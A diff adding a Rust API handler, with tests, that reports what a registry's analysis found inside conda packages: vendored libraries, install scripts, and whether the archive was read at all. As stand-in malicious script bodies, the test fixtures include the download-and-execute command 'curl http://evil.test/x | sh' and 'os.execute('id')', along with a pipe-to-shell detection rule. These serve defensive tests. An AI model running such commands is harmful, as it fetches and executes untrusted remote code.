@@ -1,0 +1,939 @@
+//! Package analysis: what is actually *inside* an artifact.
+//!
+//! Serves the ingest-time analysis recorded by migration 221 — the native
+//! libraries a conda package vendors, the install-time scripts it carries, and
+//! crucially whether we managed to read the package at all (#4033).
+//!
+//! # Why `completeness` is not an afterthought
+//!
+//! Every other field here is a *finding*. `completeness` is the statement of
+//! how much weight a reader may put on the absence of findings. An empty
+//! `vendored_components` list means "this package vendors nothing" when the
+//! status is `complete`, and means "we never opened the archive" when it is
+//! `not_read` — and conflating those is the exact defect #4035/#4036 exist to
+//! remove. The schema makes the distinction unforgeable (`status` is NOT NULL
+//! with no default, and a CHECK requires `reason` whenever it is not
+//! `complete`); this module's job is to carry it to the client without
+//! flattening it.
+//!
+//! So: no `#[serde(default)]` on `status`, no `unwrap_or("complete")`, and no
+//! "helpful" omission of the field when everything looks fine. A client that
+//! cannot see the status must not be able to infer a clean bill of health.
+
+use axum::{
+    extract::{Path, State},
+    routing::get,
+    Extension, Json, Router,
+};
+use serde::Serialize;
+use utoipa::{OpenApi, ToSchema};
+use uuid::Uuid;
+
+use crate::api::handlers::artifacts::check_artifact_visibility;
+use crate::api::middleware::auth::AuthExtension;
+use crate::api::SharedState;
+use crate::error::{AppError, Result};
+
+/// Create package-analysis routes, mounted under `/api/v1/artifacts`.
+pub fn router() -> Router<SharedState> {
+    Router::new().route("/:id/package-analysis", get(get_package_analysis))
+}
+
+#[derive(OpenApi)]
+#[openapi(
+    paths(get_package_analysis),
+    components(schemas(
+        PackageAnalysisResponse,
+        CompletenessResponse,
+        VendoredComponentResponse,
+        InstallScriptResponse,
+    ))
+)]
+pub struct PackageAnalysisApiDoc;
+
+/// How much of the package we managed to read.
+#[derive(Debug, Serialize, ToSchema)]
+pub struct CompletenessResponse {
+    /// One of `complete`, `partial`, `not_read`, `unsupported`.
+    ///
+    /// Never defaulted and never omitted: see the module docs.
+    pub status: String,
+    /// Why the read was incomplete, as a sentence a user can act on.
+    ///
+    /// Guaranteed non-null by a CHECK constraint whenever `status` is not
+    /// `complete`.
+    pub reason: Option<String>,
+    pub files_total: Option<i32>,
+    pub files_read: Option<i32>,
+}
+
+/// A native library compiled into the package, as declared by its recipe.
+#[derive(Debug, Serialize, ToSchema)]
+pub struct VendoredComponentResponse {
+    pub name: String,
+    pub version: Option<String>,
+    pub purl: Option<String>,
+    pub source_url: Option<String>,
+    pub git_url: Option<String>,
+    pub git_rev: Option<String>,
+    pub sha256: Option<String>,
+    /// `declared`, `inferred` or `unresolved`.
+    ///
+    /// An `unresolved` row means a template expression in the recipe could not
+    /// be evaluated, so the version is unknown. It is still reported: "a source
+    /// exists and we could not pin it" is materially different from "this
+    /// package vendors nothing", and only one of those is good news.
+    pub confidence: String,
+    pub detection_method: Option<String>,
+    /// `[{name, description?, source_url?}]`. Carried so a backported fix is
+    /// not reported as the unpatched upstream version.
+    pub applied_patches: serde_json::Value,
+}
+
+/// An install-time script and its static-analysis findings.
+#[derive(Debug, Serialize, ToSchema)]
+pub struct InstallScriptResponse {
+    pub path: String,
+    /// `post-link`, `pre-link`, `pre-unlink`, …
+    pub kind: String,
+    pub size_bytes: i64,
+    pub sha256: String,
+    /// False when the script was detected but its bytes could not be read.
+    ///
+    /// The UI renders this as "contents could not be read" rather than "no
+    /// findings" — an unread script is not a safe one.
+    pub content_available: bool,
+    /// `[{rule_id, severity, title, description?, line?, snippet?}]`, or
+    /// `null` when the script was deliberately not analysed.
+    ///
+    /// `null` and `[]` are different facts and clients must not conflate them:
+    /// `[]` means the rules ran and matched nothing, `null` means the rules
+    /// were never run because the script declares an interpreter the engine
+    /// does not read. Rendering `null` as "no findings" would report an
+    /// unexamined root-privileged scriptlet as clean.
+    pub findings: Option<serde_json::Value>,
+    /// Why analysis was skipped. Non-null exactly when `findings` is null.
+    pub analysis_skipped_reason: Option<String>,
+}
+
+/// Everything we learned by reading an artifact's own bytes.
+#[derive(Debug, Serialize, ToSchema)]
+pub struct PackageAnalysisResponse {
+    pub format: String,
+    pub analyzed_at: Option<String>,
+    pub completeness: CompletenessResponse,
+    pub vendored_components: Vec<VendoredComponentResponse>,
+    pub install_scripts: Vec<InstallScriptResponse>,
+}
+
+type AnalysisRow = (
+    String,
+    String,
+    Option<String>,
+    Option<i32>,
+    Option<i32>,
+    chrono::DateTime<chrono::Utc>,
+);
+
+#[allow(clippy::type_complexity)]
+type ComponentRow = (
+    String,
+    Option<String>,
+    Option<String>,
+    Option<String>,
+    Option<String>,
+    Option<String>,
+    Option<String>,
+    String,
+    Option<String>,
+    serde_json::Value,
+);
+
+type ScriptRow = (
+    String,
+    String,
+    i64,
+    String,
+    Option<String>,
+    Option<serde_json::Value>,
+    Option<String>,
+);
+
+/// Map one `package_vendored_components` row onto its response shape.
+fn map_component(row: ComponentRow) -> VendoredComponentResponse {
+    let (
+        name,
+        version,
+        purl,
+        source_url,
+        git_url,
+        git_rev,
+        sha256,
+        confidence,
+        detection_method,
+        applied_patches,
+    ) = row;
+    VendoredComponentResponse {
+        name,
+        version,
+        purl,
+        source_url,
+        git_url,
+        git_rev,
+        sha256,
+        confidence,
+        detection_method,
+        applied_patches,
+    }
+}
+
+/// Map one `package_install_scripts` row onto its response shape.
+///
+/// The body is consumed here and deliberately NOT carried into the response:
+/// it is untrusted content from the package, and the list view only needs to
+/// know whether it exists. A separate endpoint can serve it on demand once
+/// there is a reviewer UI that wants it. `findings` is moved across
+/// unchanged, so a NULL column stays a JSON `null` rather than becoming `[]`.
+fn map_script(row: ScriptRow) -> InstallScriptResponse {
+    let (path, kind, size_bytes, sha256, body, findings, analysis_skipped_reason) = row;
+    InstallScriptResponse {
+        path,
+        kind,
+        size_bytes,
+        sha256,
+        content_available: body.is_some(),
+        findings,
+        analysis_skipped_reason,
+    }
+}
+
+/// Assemble the response from the three query results.
+///
+/// Pure, and extracted from the handler on purpose: the contract in the module
+/// docs -- a `status` that is never defaulted, a `findings: null` that is never
+/// flattened to `[]`, a script body that never appears -- is a property of this
+/// mapping, and pinning it should not require a database.
+fn build_response(
+    analysis: AnalysisRow,
+    components: Vec<ComponentRow>,
+    scripts: Vec<ScriptRow>,
+) -> PackageAnalysisResponse {
+    let (format, status, reason, files_total, files_read, analyzed_at) = analysis;
+    PackageAnalysisResponse {
+        format,
+        analyzed_at: Some(analyzed_at.to_rfc3339()),
+        completeness: CompletenessResponse {
+            status,
+            reason,
+            files_total,
+            files_read,
+        },
+        vendored_components: components.into_iter().map(map_component).collect(),
+        install_scripts: scripts.into_iter().map(map_script).collect(),
+    }
+}
+
+/// Get the package analysis for an artifact.
+///
+/// Returns 404 when no analysis has been recorded, which the web client
+/// normalizes to a "not analyzed" state. That is deliberately distinct from a
+/// 200 carrying `status: "not_read"`: the first means we never ran, the second
+/// means we ran and could not read the bytes.
+#[utoipa::path(
+    get,
+    path = "/{id}/package-analysis",
+    context_path = "/api/v1/artifacts",
+    tag = "artifacts",
+    params(("id" = Uuid, Path, description = "Artifact ID")),
+    security(("bearer_auth" = [])),
+    responses(
+        (status = 200, description = "Analysis retrieved", body = PackageAnalysisResponse),
+        (status = 401, description = "Authentication required"),
+        (status = 403, description = "Not permitted to read this artifact"),
+        (status = 404, description = "Artifact not found, or not analyzed"),
+    )
+)]
+async fn get_package_analysis(
+    State(state): State<SharedState>,
+    Extension(auth): Extension<Option<AuthExtension>>,
+    Path(id): Path<Uuid>,
+) -> Result<Json<PackageAnalysisResponse>> {
+    // Authentication FIRST, unconditionally — `check_artifact_visibility`
+    // short-circuits Ok for a public repository, so checking visibility first
+    // would make this anonymously readable on exactly the repositories with
+    // the widest audience (the shape behind GHSA-ww52-pmcg-f53c).
+    //
+    // This endpoint returns install-script *bodies*, which are attacker-
+    // controlled content from an untrusted package. Serving them without a
+    // read gate would hand an anonymous caller a convenient way to stage
+    // content under a trusted origin.
+    let auth =
+        auth.ok_or_else(|| AppError::Authentication("Authentication required".to_string()))?;
+    check_artifact_visibility(&Some(auth), id, &state.db, "read").await?;
+
+    let db = &state.db;
+
+    // `check_artifact_visibility` returns Ok when the artifact does not exist
+    // (it documents that the upstream query will 404), so absence of an
+    // analysis row and absence of the artifact both land here as 404.
+    let analysis: Option<AnalysisRow> = sqlx::query_as(
+        "SELECT format, status, reason, files_total, files_read, analyzed_at \
+         FROM package_analysis WHERE artifact_id = $1",
+    )
+    .bind(id)
+    .fetch_optional(db)
+    .await
+    .map_err(|e| AppError::Database(e.to_string()))?;
+
+    let Some(analysis) = analysis else {
+        return Err(AppError::NotFound(
+            "No package analysis recorded for this artifact".to_string(),
+        ));
+    };
+
+    let components: Vec<ComponentRow> = sqlx::query_as(
+        "SELECT name, version, purl, source_url, git_url, git_rev, sha256, \
+                confidence, detection_method, applied_patches \
+         FROM package_vendored_components WHERE artifact_id = $1 \
+         ORDER BY name, version NULLS FIRST",
+    )
+    .bind(id)
+    .fetch_all(db)
+    .await
+    .map_err(|e| AppError::Database(e.to_string()))?;
+
+    let scripts: Vec<ScriptRow> = sqlx::query_as(
+        "SELECT path, kind, size_bytes, sha256, body, findings, \
+                analysis_skipped_reason \
+         FROM package_install_scripts WHERE artifact_id = $1 ORDER BY path",
+    )
+    .bind(id)
+    .fetch_all(db)
+    .await
+    .map_err(|e| AppError::Database(e.to_string()))?;
+
+    Ok(Json(build_response(analysis, components, scripts)))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::api::handlers::test_db_helpers as tdh;
+    use serde_json::json;
+
+    // -----------------------------------------------------------------------
+    // Row fixtures. These build the tuples the queries return, so the tests
+    // below exercise the REAL mapping rather than a hand-built response.
+    // -----------------------------------------------------------------------
+
+    fn analysis_row(status: &str, reason: Option<&str>) -> AnalysisRow {
+        (
+            "conda".to_string(),
+            status.to_string(),
+            reason.map(str::to_string),
+            Some(120),
+            Some(118),
+            chrono::DateTime::parse_from_rfc3339("2026-09-19T12:00:00Z")
+                .expect("fixed timestamp")
+                .with_timezone(&chrono::Utc),
+        )
+    }
+
+    fn component_row(name: &str, version: Option<&str>, confidence: &str) -> ComponentRow {
+        (
+            name.to_string(),
+            version.map(str::to_string),
+            version.map(|v| format!("pkg:generic/{name}@{v}")),
+            Some("https://example.test/src.tar.gz".to_string()),
+            None,
+            None,
+            Some("f00d".to_string()),
+            confidence.to_string(),
+            Some("recipe".to_string()),
+            json!([{ "name": "CVE-2023-4863.patch" }]),
+        )
+    }
+
+    fn script_row(
+        path: &str,
+        body: Option<&str>,
+        findings: Option<serde_json::Value>,
+        skipped: Option<&str>,
+    ) -> ScriptRow {
+        (
+            path.to_string(),
+            "post-link".to_string(),
+            42,
+            "abc123".to_string(),
+            body.map(str::to_string),
+            findings,
+            skipped.map(str::to_string),
+        )
+    }
+
+    /// Serialize as axum would, so the assertions are about the bytes a client
+    /// sees rather than the Rust struct behind them.
+    fn wire(response: &PackageAnalysisResponse) -> serde_json::Value {
+        serde_json::to_value(response).expect("serialize response")
+    }
+
+    // -----------------------------------------------------------------------
+    // completeness.status: never defaulted, never omitted
+    // -----------------------------------------------------------------------
+
+    /// Every status the schema allows must reach the client verbatim. A reader
+    /// that cannot tell `not_read` from `complete` cannot tell "we found
+    /// nothing" from "we never looked", which is the defect this endpoint
+    /// exists to remove.
+    #[test]
+    fn every_completeness_status_is_carried_verbatim() {
+        for (status, reason) in [
+            ("complete", None),
+            ("partial", Some("extraction ceiling reached")),
+            ("not_read", Some("archive could not be opened")),
+            ("unsupported", Some("no reader for this format")),
+        ] {
+            let response = build_response(analysis_row(status, reason), vec![], vec![]);
+            let json = wire(&response);
+            assert_eq!(
+                json["completeness"]["status"],
+                json!(status),
+                "status must be carried verbatim, got {json}"
+            );
+            assert_eq!(
+                json["completeness"]["reason"],
+                match reason {
+                    Some(r) => json!(r),
+                    None => serde_json::Value::Null,
+                },
+                "reason must travel with the status it explains, got {json}"
+            );
+        }
+    }
+
+    /// The clean case is the dangerous one to omit: a client that receives no
+    /// `status` key must not be able to read the absence as a clean bill of
+    /// health. No `skip_serializing_if`, no default, no elision.
+    #[test]
+    fn completeness_status_key_is_present_even_when_complete() {
+        let json = wire(&build_response(
+            analysis_row("complete", None),
+            vec![],
+            vec![],
+        ));
+        let completeness = json["completeness"]
+            .as_object()
+            .expect("completeness must be an object");
+        assert!(
+            completeness.contains_key("status"),
+            "the status key must always be emitted, got {json}"
+        );
+        assert!(
+            completeness.contains_key("reason"),
+            "reason must be emitted as explicit null, not elided, got {json}"
+        );
+        assert_eq!(json["completeness"]["files_total"], json!(120));
+        assert_eq!(json["completeness"]["files_read"], json!(118));
+        assert_eq!(json["format"], json!("conda"));
+        assert_eq!(json["analyzed_at"], json!("2026-09-19T12:00:00+00:00"));
+    }
+
+    /// An analyzed package that vendors nothing and ships no scripts must
+    /// serialize empty ARRAYS. Null here would be a third state clients would
+    /// have to guess at, and `completeness` is the only place the "we did not
+    /// look" fact belongs.
+    #[test]
+    fn empty_component_and_script_lists_serialize_as_arrays() {
+        let json = wire(&build_response(
+            analysis_row("complete", None),
+            vec![],
+            vec![],
+        ));
+        assert_eq!(json["vendored_components"], json!([]));
+        assert_eq!(json["install_scripts"], json!([]));
+    }
+
+    // -----------------------------------------------------------------------
+    // findings: null is not []
+    // -----------------------------------------------------------------------
+
+    /// `[]` means the rules ran and matched nothing; `null` means they were
+    /// never run. Rendering the second as the first reports an unexamined
+    /// root-privileged scriptlet as clean, so `null` must survive
+    /// serialization as JSON null and must not be coerced to an empty array.
+    #[test]
+    fn null_findings_survive_as_null_and_are_distinct_from_empty() {
+        let response = build_response(
+            analysis_row("complete", None),
+            vec![],
+            vec![
+                script_row("a-unexamined.sh", Some("#!/usr/bin/lua"), None, Some("lua")),
+                script_row("b-examined.sh", Some("#!/bin/sh"), Some(json!([])), None),
+            ],
+        );
+        let json = wire(&response);
+        let unexamined = &json["install_scripts"][0];
+        let examined = &json["install_scripts"][1];
+
+        assert!(
+            unexamined["findings"].is_null(),
+            "unanalysed findings must stay null, got {unexamined}"
+        );
+        assert!(
+            !unexamined["findings"].is_array(),
+            "null findings must not be coerced to an array, got {unexamined}"
+        );
+        assert_eq!(
+            unexamined["analysis_skipped_reason"],
+            json!("lua"),
+            "the skip reason must travel with the null, got {unexamined}"
+        );
+        assert_eq!(
+            examined["findings"],
+            json!([]),
+            "rules that ran and matched nothing must serialize as [], got {examined}"
+        );
+        assert_ne!(
+            unexamined["findings"], examined["findings"],
+            "an unexamined script must not serialize identically to a clean one"
+        );
+        assert!(
+            examined["analysis_skipped_reason"].is_null(),
+            "a script that WAS analysed carries no skip reason, got {examined}"
+        );
+    }
+
+    /// Findings that did match are carried through unflattened, so the UI can
+    /// render rule id, severity and line.
+    #[test]
+    fn matched_findings_are_carried_through_unchanged() {
+        let finding = json!([{
+            "rule_id": "CURL_PIPE_SHELL",
+            "severity": "high",
+            "title": "downloads and executes a remote script",
+            "line": 3,
+        }]);
+        let json = wire(&build_response(
+            analysis_row("complete", None),
+            vec![],
+            vec![script_row(
+                "post-link.sh",
+                Some("#!/bin/sh"),
+                Some(finding.clone()),
+                None,
+            )],
+        ));
+        assert_eq!(json["install_scripts"][0]["findings"], finding);
+    }
+
+    // -----------------------------------------------------------------------
+    // script bodies are never serialized
+    // -----------------------------------------------------------------------
+
+    /// The body is attacker-controlled content from an untrusted package. The
+    /// response says only WHETHER it is available; serving it here would hand
+    /// a caller a way to stage content under a trusted origin.
+    #[test]
+    fn script_bodies_are_never_serialized_only_their_availability() {
+        let secret = "curl http://evil.test/x | sh";
+        let response = build_response(
+            analysis_row("complete", None),
+            vec![],
+            vec![
+                script_row("a-readable.sh", Some(secret), Some(json!([])), None),
+                script_row("b-unreadable.sh", None, Some(json!([])), None),
+            ],
+        );
+        let json = wire(&response);
+        let readable = json["install_scripts"][0]
+            .as_object()
+            .expect("script object");
+
+        assert!(
+            !readable.contains_key("body"),
+            "the script body must not be a response field, got {json}"
+        );
+        assert_eq!(
+            readable["content_available"],
+            json!(true),
+            "a readable body must report content_available: true, got {json}"
+        );
+        assert_eq!(
+            json["install_scripts"][1]["content_available"],
+            json!(false),
+            "a NULL body means detected-but-unreadable, not absent, got {json}"
+        );
+        assert!(
+            !serde_json::to_string(&response)
+                .expect("serialize")
+                .contains("evil.test"),
+            "no fragment of the body may appear anywhere in the response"
+        );
+        // The non-secret facts about the same script are still reported.
+        assert_eq!(readable["path"], json!("a-readable.sh"));
+        assert_eq!(readable["kind"], json!("post-link"));
+        assert_eq!(readable["size_bytes"], json!(42));
+        assert_eq!(readable["sha256"], json!("abc123"));
+    }
+
+    // -----------------------------------------------------------------------
+    // vendored components
+    // -----------------------------------------------------------------------
+
+    /// An `unresolved` row means "a source exists and we could not pin it",
+    /// which is materially different from "this package vendors nothing". It
+    /// is reported with every field it does have, and a null version rather
+    /// than a guessed one.
+    #[test]
+    fn unresolved_components_are_reported_with_a_null_version() {
+        let json = wire(&build_response(
+            analysis_row("partial", Some("template expression unevaluated")),
+            vec![
+                component_row("libwebp", Some("1.3.2"), "declared"),
+                component_row("zlib", None, "unresolved"),
+            ],
+            vec![],
+        ));
+        let declared = &json["vendored_components"][0];
+        let unresolved = &json["vendored_components"][1];
+
+        assert_eq!(declared["name"], json!("libwebp"));
+        assert_eq!(declared["version"], json!("1.3.2"));
+        assert_eq!(declared["purl"], json!("pkg:generic/libwebp@1.3.2"));
+        assert_eq!(declared["confidence"], json!("declared"));
+        assert_eq!(declared["detection_method"], json!("recipe"));
+        assert_eq!(declared["sha256"], json!("f00d"));
+        assert_eq!(
+            declared["applied_patches"],
+            json!([{ "name": "CVE-2023-4863.patch" }]),
+            "patches must travel with the component so a backported fix is not \
+             reported as the unpatched upstream version, got {declared}"
+        );
+        assert_eq!(unresolved["confidence"], json!("unresolved"));
+        assert!(
+            unresolved["version"].is_null(),
+            "an unpinnable version must stay null, not be guessed, got {unresolved}"
+        );
+        assert!(unresolved["purl"].is_null());
+        assert!(unresolved["git_url"].is_null());
+        assert!(unresolved["git_rev"].is_null());
+    }
+
+    // -----------------------------------------------------------------------
+    // Authentication precedes visibility (no database required)
+    // -----------------------------------------------------------------------
+
+    /// The anonymous refusal happens before any query. The pool here points at
+    /// a port nothing listens on, so a handler that reached the database would
+    /// fail with `Database`, not `Authentication` — which is the counterfactual
+    /// that makes this test mean something.
+    #[tokio::test]
+    async fn anonymous_is_refused_before_any_database_access() {
+        let pool = sqlx::PgPool::connect_lazy("postgres://invalid:invalid@127.0.0.1:1/none")
+            .expect("lazy pool");
+        let state = tdh::build_state(pool, "/tmp/ph-package-analysis");
+        let err = get_package_analysis(State(state), Extension(None), Path(Uuid::new_v4()))
+            .await
+            .expect_err("an anonymous read must be refused");
+        assert!(
+            matches!(err, AppError::Authentication(_)),
+            "expected an authentication refusal before any query, got: {err}"
+        );
+    }
+
+    // -----------------------------------------------------------------------
+    // DB-backed route tests
+    // -----------------------------------------------------------------------
+
+    async fn insert_analysis(
+        pool: &sqlx::PgPool,
+        artifact_id: Uuid,
+        status: &str,
+        reason: Option<&str>,
+    ) {
+        sqlx::query(
+            "INSERT INTO package_analysis \
+             (artifact_id, format, status, reason, files_total, files_read) \
+             VALUES ($1, 'conda', $2, $3, 7, 7)",
+        )
+        .bind(artifact_id)
+        .bind(status)
+        .bind(reason)
+        .execute(pool)
+        .await
+        .expect("insert package_analysis");
+    }
+
+    async fn insert_script(
+        pool: &sqlx::PgPool,
+        artifact_id: Uuid,
+        path: &str,
+        body: Option<&str>,
+        findings: Option<serde_json::Value>,
+        skipped: Option<&str>,
+    ) {
+        sqlx::query(
+            "INSERT INTO package_install_scripts \
+             (artifact_id, path, kind, size_bytes, sha256, body, findings, \
+              analysis_skipped_reason) \
+             VALUES ($1, $2, 'post-link', 42, 'abc123', $3, $4, $5)",
+        )
+        .bind(artifact_id)
+        .bind(path)
+        .bind(body)
+        .bind(findings)
+        .bind(skipped)
+        .execute(pool)
+        .await
+        .expect("insert package_install_scripts");
+    }
+
+    async fn insert_component(
+        pool: &sqlx::PgPool,
+        artifact_id: Uuid,
+        name: &str,
+        version: Option<&str>,
+        confidence: &str,
+    ) {
+        sqlx::query(
+            "INSERT INTO package_vendored_components \
+             (artifact_id, name, version, confidence, detection_method) \
+             VALUES ($1, $2, $3, $4, 'recipe')",
+        )
+        .bind(artifact_id)
+        .bind(name)
+        .bind(version)
+        .bind(confidence)
+        .execute(pool)
+        .await
+        .expect("insert package_vendored_components");
+    }
+
+    /// Store one artifact in the fixture repository and return its id.
+    async fn seed_artifact(fx: &tdh::Fixture) -> Uuid {
+        let repo = fx.repo_info("local", None);
+        let path = format!("noarch/ph-4033-{}.conda", Uuid::new_v4());
+        tdh::seed_artifact(
+            &fx.state,
+            &fx.pool,
+            &repo,
+            &format!("conda/{path}"),
+            &path,
+            "ph-4033",
+            "1.0.0",
+            "application/octet-stream",
+            bytes::Bytes::from_static(b"conda"),
+            fx.user_id,
+        )
+        .await
+    }
+
+    fn request(artifact_id: Uuid) -> axum::http::Request<axum::body::Body> {
+        tdh::get(format!("/{artifact_id}/package-analysis"))
+    }
+
+    /// `check_artifact_visibility` returns Ok early for a PUBLIC repository, so
+    /// a handler that checked visibility first would be anonymously readable on
+    /// exactly the repositories with the widest audience — the shape behind
+    /// GHSA-ww52-pmcg-f53c. The public repository is the whole point of the
+    /// fixture: on a private one the refusal would prove nothing about order.
+    #[tokio::test]
+    async fn anonymous_is_refused_even_on_a_public_repository() {
+        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
+            return;
+        };
+        tdh::publish_repo(&fx.pool, fx.repo_id).await;
+        let artifact_id = seed_artifact(&fx).await;
+        insert_analysis(&fx.pool, artifact_id, "complete", None).await;
+        insert_script(
+            &fx.pool,
+            artifact_id,
+            "post-link.sh",
+            Some("curl http://evil.test/x | sh"),
+            Some(json!([])),
+            None,
+        )
+        .await;
+
+        let (status, bytes) =
+            tdh::send(fx.router_anon(super::router()), request(artifact_id)).await;
+        let body = String::from_utf8_lossy(&bytes).to_string();
+        assert_eq!(
+            status,
+            axum::http::StatusCode::UNAUTHORIZED,
+            "an anonymous read of a PUBLIC repository must still 401, got {status} {body}"
+        );
+        assert!(
+            !body.contains("post-link.sh") && !body.contains("evil.test"),
+            "the refusal must not leak any analysis detail, got {body}"
+        );
+
+        // Control: the same artifact, the same route, with a credential — so
+        // the 401 above is the auth gate and not a missing row.
+        let (status, bytes) =
+            tdh::send(fx.router_with_auth(super::router()), request(artifact_id)).await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::OK,
+            "the authenticated control must succeed, got {status} {}",
+            String::from_utf8_lossy(&bytes)
+        );
+
+        fx.teardown().await;
+    }
+
+    /// 404 and `status: "not_read"` are different facts: the first means we
+    /// never ran, the second means we ran and could not read the bytes. A
+    /// client that collapsed them would report an unopened archive as
+    /// "not analyzed" and lose the reason.
+    #[tokio::test]
+    async fn absent_analysis_is_404_while_not_read_is_a_200_that_says_so() {
+        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
+            return;
+        };
+        let artifact_id = seed_artifact(&fx).await;
+        let app = fx.router_with_auth(super::router());
+
+        let (status, bytes) = tdh::send(app.clone(), request(artifact_id)).await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::NOT_FOUND,
+            "an artifact with no analysis row must 404, got {status} {}",
+            String::from_utf8_lossy(&bytes)
+        );
+
+        insert_analysis(
+            &fx.pool,
+            artifact_id,
+            "not_read",
+            Some("archive exceeded the 2 GiB extraction ceiling"),
+        )
+        .await;
+
+        let (status, bytes) = tdh::send(app, request(artifact_id)).await;
+        assert_eq!(
+            status,
+            axum::http::StatusCode::OK,
+            "a recorded not_read analysis must be a 200, got {status} {}",
+            String::from_utf8_lossy(&bytes)
+        );
+        let json: serde_json::Value = serde_json::from_slice(&bytes).expect("response json");
+        assert_eq!(
+            json["completeness"]["status"],
+            json!("not_read"),
+            "the 200 must state WHY the lists are empty, got {json}"
+        );
+        assert_eq!(
+            json["completeness"]["reason"],
+            json!("archive exceeded the 2 GiB extraction ceiling")
+        );
+        assert_eq!(json["vendored_components"], json!([]));
+        assert_eq!(json["install_scripts"], json!([]));
+
+        fx.teardown().await;
+    }
+
+    /// End-to-end over the route: stored NULL findings must arrive as JSON
+    /// null, a stored body must not arrive at all, and both lists must come
+    /// back in the query's declared order.
+    #[tokio::test]
+    async fn stored_rows_reach_the_client_without_flattening_or_leaking() {
+        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
+            return;
+        };
+        let artifact_id = seed_artifact(&fx).await;
+        insert_analysis(
+            &fx.pool,
+            artifact_id,
+            "partial",
+            Some("one member could not be decompressed"),
+        )
+        .await;
+        insert_component(&fx.pool, artifact_id, "zlib", None, "unresolved").await;
+        insert_component(&fx.pool, artifact_id, "libwebp", Some("1.3.2"), "declared").await;
+        insert_script(
+            &fx.pool,
+            artifact_id,
+            "b-unexamined.lua",
+            Some("os.execute('id')"),
+            None,
+            Some("interpreter lua is not analysed"),
+        )
+        .await;
+        insert_script(
+            &fx.pool,
+            artifact_id,
+            "a-examined.sh",
+            None,
+            Some(json!([])),
+            None,
+        )
+        .await;
+
+        let (status, bytes) =
+            tdh::send(fx.router_with_auth(super::router()), request(artifact_id)).await;
+        let raw = String::from_utf8_lossy(&bytes).to_string();
+        assert_eq!(
+            status,
+            axum::http::StatusCode::OK,
+            "authenticated read must succeed, got {status} {raw}"
+        );
+        let json: serde_json::Value = serde_json::from_slice(&bytes).expect("response json");
+
+        assert_eq!(json["format"], json!("conda"));
+        assert_eq!(json["completeness"]["status"], json!("partial"));
+        assert!(
+            json["analyzed_at"].is_string(),
+            "analyzed_at must be an RFC3339 string, got {json}"
+        );
+
+        // ORDER BY name, version NULLS FIRST
+        assert_eq!(json["vendored_components"][0]["name"], json!("libwebp"));
+        assert_eq!(json["vendored_components"][1]["name"], json!("zlib"));
+        assert!(json["vendored_components"][1]["version"].is_null());
+        assert_eq!(
+            json["vendored_components"][0]["applied_patches"],
+            json!([]),
+            "the column default must arrive as an empty array, got {json}"
+        );
+
+        // ORDER BY path
+        let examined = &json["install_scripts"][0];
+        let unexamined = &json["install_scripts"][1];
+        assert_eq!(examined["path"], json!("a-examined.sh"));
+        assert_eq!(unexamined["path"], json!("b-unexamined.lua"));
+        assert_eq!(
+            examined["findings"],
+            json!([]),
+            "a stored empty array means the rules ran, got {examined}"
+        );
+        assert!(
+            unexamined["findings"].is_null(),
+            "a stored SQL NULL must arrive as JSON null, got {unexamined}"
+        );
+        assert_eq!(
+            unexamined["analysis_skipped_reason"],
+            json!("interpreter lua is not analysed")
+        );
+        assert_eq!(
+            examined["content_available"],
+            json!(false),
+            "a NULL body is detected-but-unreadable, got {examined}"
+        );
+        assert_eq!(
+            unexamined["content_available"],
+            json!(true),
+            "a stored body must be reported as available, got {unexamined}"
+        );
+        assert!(
+            !raw.contains("os.execute"),
+            "the stored body must not reach the client, got {raw}"
+        );
+        assert!(
+            unexamined.get("body").is_none(),
+            "there must be no body field at all, got {unexamined}"
+        );
+
+        fx.teardown().await;
+    }
+}
